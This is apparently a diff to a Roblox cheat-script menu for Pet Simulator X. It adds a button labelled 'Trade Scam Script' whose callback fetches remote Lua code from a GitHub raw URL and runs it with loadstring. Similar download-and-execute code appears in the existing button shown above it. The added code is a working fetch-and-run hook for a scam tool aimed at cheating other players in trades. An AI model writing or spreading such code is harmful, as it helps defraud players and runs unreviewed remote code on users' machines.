@@ -50,3 +50,9 @@ local JmesButton = PsxTab:CreateButton({
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
    end,
 })
+local TradescamButton = PsxTab:CreateButton({
+    Name = "Trade Scam Script",
+    Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/Shmoly/fuck-psx/main/PsxCatLoadingScript.lua"))()
+    end,
+ })
